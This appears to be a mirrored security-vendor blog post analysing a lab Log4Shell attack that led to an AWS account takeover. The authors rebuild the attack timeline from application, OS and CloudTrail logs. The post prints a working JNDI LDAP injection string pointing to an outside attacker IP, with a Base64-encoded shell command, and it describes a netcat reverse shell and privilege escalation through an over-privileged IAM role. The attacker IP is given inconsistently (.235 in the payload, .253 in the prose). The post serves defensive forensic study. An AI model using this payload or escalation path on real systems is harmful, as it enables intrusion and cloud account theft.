<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell">Original</a>
    <h1>AWS Account Takeover via Log4Shell</h1>
    
    <div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div><div><div data-rce-version="8.63.6"><div dir="ltr" data-id="rich-content-viewer"><div><h2 id="viewer-foo"><span>We installed Log4j on AWS, and then hacked it. Here&#39;s what we learned.</span></h2><p id="viewer-3bkgu"><span>Apache&#39;s Log4j logging utility has received widespread media attention in the last few weeks due to a critical (and easily exploitable) zero-day vulnerability (CVE-2021-44228) discovered in its JNDI (Java Naming and Directory Interface) message lookup method. The exposure enables a remote attacker to send specially crafted messages to vulnerable web servers to trigger unauthenticated code execution through JNDI injection and, most commonly, the LDAP protocol. When a vulnerable web server receives a request with the string (for example) <em>${jndi:ldap://&lt;host&gt;:&lt;port&gt;/&lt;commands&gt;...} </em>within an HTTP header or as part of URL, the server will log the request and send an LDAP query to an attacker-controlled LDAP server. The query will generally contain the commands specified in the JNDI:LDAP string, which the vulnerable server then fetches, deserializes, and executes within the user context running the vulnerable application, resulting in arbitrary remote code execution.</span></p><p id="viewer-9kuqm"><span>In this blog, we will present a scenario in which exploiting a vulnerable Log4j application results in the takeover of an AWS account. Certain conditions must be present to achieve a complete AWS account takeover through the Log4j vulnerability, and we are by no means suggesting that a link between Log4j2 and AWS exists. However, we intend to show you that a vulnerable Log4j2 application hosted in AWS (or any other public cloud), paired with poor security practices, could make this scenario a reality.</span></p><h2 id="viewer-1bajm"><span><strong>Setting Up the Environment
</strong>
</span></h2><p id="viewer-bmu5u"><span>We executed all the steps outlined in this blog in a lab environment to show the vulnerability&#39;s ease of exploitation, severity, and potential impacts. </span></p><p id="viewer-7qsav"><span>We used a slightly modified version of <a data-hook="linkViewer" href="https://github.com/christophetd/" target="_blank" rel="noopener noreferrer">@christophetd&#39;s</a> <a data-hook="linkViewer" href="https://github.com/christophetd/log4shell-vulnerable-app" target="_blank" rel="noopener noreferrer">Log4Shell Vulnerable App</a> deployed as a Docker container in an EC2 instance for our vulnerable application. We also deployed a virtual machine in Digital Ocean to send JNDI injection requests to the vulnerable app and serve the exploit code that the vulnerable app would later fetch upon receiving the injection request. </span></p><p id="viewer-70ge5"><span>We ran the <a data-hook="linkViewer" href="https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2" target="_blank" rel="noopener noreferrer">JNDIExploit</a> in a virtual machine in Digital Ocean to server malicious LDAP queries received from the vulnerable app and deliver our initial exploit code. Additionally, we set up a Netcat listener on the same server to control the vulnerable server remotely following successful exploit execution. </span></p><div id="viewer-e5hqi"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Log4j exploit AWS architecture"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_eb1ab7f6974d41f3aa001ea9aa00cb3e~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_eb1ab7f6974d41f3aa001ea9aa00cb3e~mv2.png/v1/fill/w_1000,h_432,al_c,usm_0.66_1.00_0.01/1fea66_eb1ab7f6974d41f3aa001ea9aa00cb3e~mv2.png" alt="Log4j exploit AWS architecture"/></p></div><p><span dir="auto">Our Log4j exploit AWS architecture</span></p></div></div></div><h2 id="viewer-el17n"><span><strong>The Exploit</strong></span></h2><p id="viewer-6i1nc"><span>We used a straightforward exploit code to establish a <em>Netcat</em> reverse shell to the app&#39;s Docker container. Once inside the container, the AWS CLI allowed us full access to all AWS resources within the account through the IAM role attached to the EC2 instance running the container.</span></p><h2 id="viewer-cnosu"><span><strong>The Attack</strong></span></h2><p id="viewer-3fjqn"><span>To establish the attack timeline, we analyzed the following log files in Gigasheet:</span></p><ul><li id="viewer-2tpiv"><p>Docker container application log</p></li><li id="viewer-a87on"><p>Docker container OS logs (syslog and dpkg.log)</p></li><li id="viewer-94bnm"><p>AWS CloudTrail logs</p></li></ul><p id="viewer-f1ush"><span>The Docker container application log file contains the Log4j2 logs, which combine Java multiline and Apache weblogs. The vulnerable app comes with a Log4j2 logger that will trigger when the application receives web requests with the <em>X-Api-Version</em> HTTP header set. Under this scenario, the Log4j2 logger will record an informational (INFO) log message with the value of the <em>X-Api-Version</em> header. By applying a filter that looks for the keyword INFO in column A, we can essentially identify all the requests that Log4j2 logged:</span></p><div id="viewer-1i3c9"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Requests that Log4j logged"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_2af1b300b95f4e0583eedaf168db2e51~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_2af1b300b95f4e0583eedaf168db2e51~mv2.png/v1/fill/w_1000,h_800,al_c,usm_0.66_1.00_0.01/1fea66_2af1b300b95f4e0583eedaf168db2e51~mv2.png" alt="Requests that Log4j logged"/></p></div><p><span dir="auto">Requests that Log4j logged</span></p></div></div></div><p id="viewer-dtcv"><span>Let&#39;s take a look at the following log message:</span></p><pre id="viewer-bhpv2"><span><em>$</em><span><em>{</em></span><em>jndi</em><span><em>:</em></span><em>ldap</em><span><em>:</em></span><span><em>/</em></span><span><em>/</em></span><span><em>143.244</em></span><span><em>.161</em></span><span><em>.235</em></span><span><em>:</em></span><span><em>1389</em></span><span><em>/</em></span><em>Basic</em><span><em>/</em></span><em>Command</em><span><em>/</em></span><em>Base64</em><span><em>/</em></span><em>L2Jpbi9zaCAvdG1wLy5iLnNo</em><span><em>}</em></span></span></pre><p id="viewer-kj7r"><span>This log instructs the vulnerable application to send an LDAP query for the Base64-encoded value in the URL path to 143.244.161.253 over port 1389. Upon receiving the LDAP query, the malicious LDAP server (143.244.161.253) will serve the exploit code over port TCP 8888. The Base64 values in the X-Api-Version headers are essentially the commands we want the vulnerable app server to execute.</span></p><div id="viewer-asnof"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Split on / to isolate Base64 strings"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_01a27ff5e1d449e997de8abd213bab91~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_01a27ff5e1d449e997de8abd213bab91~mv2.png/v1/fill/w_1000,h_770,al_c,usm_0.66_1.00_0.01/1fea66_01a27ff5e1d449e997de8abd213bab91~mv2.png" alt="Split on / to isolate Base64 strings"/></p></div><p><span dir="auto">Split on / to isolate Base64 strings</span></p></div></div></div><p id="viewer-1crkk"><span>We can use Gigasheet&#39;s <em>split column </em>function using the forward-slash (/) as a separator to place the Base64 values in a separate column. We can then export the results and copy the column containing the Base64 values (removing the ending curly bracket) into a decoder to reveal the commands sent to the server. </span></p><blockquote id="viewer-e4tgu"><span>Note: Base64 decoding is coming to Gigasheet soon! The new decoding function will automatically search a given columns for any Base64 string and decode it. Expected release is Dec 2021.</span></blockquote><div id="viewer-cuf6s"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Decoding Base64 strings"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_e1ea3f51a5dd45eaa13f599495814772~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_e1ea3f51a5dd45eaa13f599495814772~mv2.png/v1/fill/w_1000,h_518,al_c,usm_0.66_1.00_0.01/1fea66_e1ea3f51a5dd45eaa13f599495814772~mv2.png" alt="Decoding Base64 strings"/></p></div><p><span dir="auto">Decoding Base64 strings</span></p></div></div></div><p id="viewer-bbrh0"><span>The commands below indicate that a script named <em>.b.sh </em>containing a netcat reverse shell to 143[.]244[.]161[.]235:9001 was placed in the Docker container&#39;s /tmp directory and later executed twice in an attempt to access the container.</span></p><div id="viewer-es413"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Decoded Values"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_a87b98a11caa49ff87418af8feb5637f~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_a87b98a11caa49ff87418af8feb5637f~mv2.png/v1/fill/w_1000,h_620,al_c,usm_0.66_1.00_0.01/1fea66_a87b98a11caa49ff87418af8feb5637f~mv2.png" alt="Decoded Values"/></p></div><p><span dir="auto">Decoded Values</span></p></div></div></div><p id="viewer-a6j7n"><span>Unfortunately, the Log4j2 logs will not tell us what happened inside the Docker container following successful reverse shell execution. Still, we can switch to the Docker container operating system logs to attempt to complete the timeline.</span></p><p id="viewer-aqo1s"><span>The first reverse shell execution took place at 10:59:45.829 on 2021-12-18, as indicated by the following log:</span></p><div id="viewer-5ltr6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Log4j exploit AWS analysis"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_33449a06c7984babba52564d1cab404f~mv2.png/v1/fit/w_1000%2Ch_760%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_33449a06c7984babba52564d1cab404f~mv2.png/v1/fill/w_1000,h_292,al_c,usm_0.66_1.00_0.01/1fea66_33449a06c7984babba52564d1cab404f~mv2.png" alt="Log4j exploit AWS analysis"/></p></div></div></div></div><p id="viewer-a4kpo"><span>Let&#39;s look at the Docker container&#39;s syslog file. Approximately fifteen minutes after executing the first reverse shell, a new user account named <em>debian</em> was created in the Docker container and added to the <em>sudoers</em> file. </span></p><div id="viewer-5l9g6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Docker Syslog - Log4j Analysis"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_83127893599342fdab15893adcc77a12~mv2.png/v1/fit/w_1000%2Ch_842%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_83127893599342fdab15893adcc77a12~mv2.png/v1/fill/w_1000,h_323,al_c,usm_0.66_1.00_0.01/1fea66_83127893599342fdab15893adcc77a12~mv2.png" alt="Docker Syslog - Log4j Analysis"/></p></div></div></div></div><p id="viewer-fqm5b"><span>Switching to the dpkg.log file, we see that various packages were installed on the Docker container, such as the AWS CLI and net-tools, following the creation of the <em>debian</em> user account.</span></p><div id="viewer-brb6i"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="dpkg.log - Log4j Exploit"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_b23955bf06634bb2b262b0c91156d7e7~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_b23955bf06634bb2b262b0c91156d7e7~mv2.png/v1/fill/w_1000,h_772,al_c,usm_0.66_1.00_0.01/1fea66_b23955bf06634bb2b262b0c91156d7e7~mv2.png" alt="dpkg.log - Log4j Exploit"/></p></div><p><span dir="auto">dpkg.log</span></p></div></div></div><p id="viewer-6k232"><span>The AWS CLI installation may suggest that the attacker attempted to access AWS resources from the Docker container by invoking AWS&#39; APIs. Therefore, we can switch to the AWS CloudTrail logs to complete the timeline. We are only interested in CloudTrail events that occurred after the AWS CLI installation on the Docker container, so we apply a filter to the Event Time column to display logs timestamped 11:16 or later on 12/18/2021.</span></p><div id="viewer-7p1po"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Event time filter "><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_e0fb79e2c049411ebf58538cae5c5e8d~mv2.png/v1/fit/w_1000%2Ch_632%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_e0fb79e2c049411ebf58538cae5c5e8d~mv2.png/v1/fill/w_1000,h_362,al_c,usm_0.66_1.00_0.01/1fea66_e0fb79e2c049411ebf58538cae5c5e8d~mv2.png" alt="Event time filter "/></p></div></div></div></div><div id="viewer-ab4as"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Log filter results"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_57db1bb0250842849368cfe3f65b8736~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_57db1bb0250842849368cfe3f65b8736~mv2.png/v1/fill/w_1000,h_516,al_c,usm_0.66_1.00_0.01/1fea66_57db1bb0250842849368cfe3f65b8736~mv2.png" alt="Log filter results"/></p></div></div></div></div><p id="viewer-9rr6a"><span>The first CloudTrail log indicates that an AWS role named <em>Ec2s3readonly</em> was used to return a set of temporary security credentials on resource I-0e300dd817f3a1329, the EC2 instance running the Docker container with the vulnerable app. These temporary credentials were later used to query various AWS APIs, create an IAM user account with administrative privileges to all AWS resources, and access the AWS console via a web browser.  </span></p><div id="viewer-9r38o"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="IAM account creation with admin privileges"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_5a8d7e31efa845b2b74c86c12212cfac~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_5a8d7e31efa845b2b74c86c12212cfac~mv2.png/v1/fill/w_1000,h_514,al_c,usm_0.66_1.00_0.01/1fea66_5a8d7e31efa845b2b74c86c12212cfac~mv2.png" alt="IAM account creation with admin privileges"/></p></div></div></div></div><p id="viewer-1f8q5"><span>Grouping by the <em>User Name</em> column will quickly reveal the new IAM user that was not part of our AWS account before the Docker container compromise. This account logged into the AWS Console approximately 55 minutes following the first reverse shell execution.</span></p><div id="viewer-9jatr"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Group By User Name"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_efe0612d9f7a49c2b2406f5bcd861e00~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/1fea66_efe0612d9f7a49c2b2406f5bcd861e00~mv2.png/v1/fill/w_1000,h_699,al_c,usm_0.66_1.00_0.01/1fea66_efe0612d9f7a49c2b2406f5bcd861e00~mv2.png" alt="Group By User Name"/></p></div><p><span dir="auto">Group By User Name</span></p></div></div></div><h2 id="viewer-altjo"><span><strong>The Weakness</strong></span></h2><p id="viewer-9geir"><span>The AWS account takeover was possible because a highly privileged IAM role had been assigned to the EC2 instance running the vulnerable Docker container app. While the Log4j2 vulnerability allowed initial access to the Docker container, the privileged IAM role enabled lateral movement and ultimately a total compromise of the AWS account.</span></p><p id="viewer-60mbt"><span><a data-hook="linkViewer" href="https://beta.gigasheet.co" target="_blank" rel="noopener noreferrer"><u>Create your free Gigasheet account today!</u></a> </span></p><div id="viewer-34c5f"><div><div data-hook="imageViewer" role="button" tabindex="0"><div aria-label="Log4Shell AWS Account Takeover"><p><img data-pin-url="https://www.gigasheet.co/post/aws-account-takeover-via-log4shell" data-pin-media="https://static.wixstatic.com/media/1fea66_8b79ff110cc3430bb79663bfc1a7ca35~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.jpg" src="https://static.wixstatic.com/media/1fea66_8b79ff110cc3430bb79663bfc1a7ca35~mv2.jpg/v1/fill/w_1000,h_750,al_c,q_90,usm_0.66_1.00_0.01/1fea66_8b79ff110cc3430bb79663bfc1a7ca35~mv2.jpg" alt="Log4Shell AWS Account Takeover"/></p></div></div></div></div></div></div></div></div></div></div></article></div></div>
  </body>
</html>
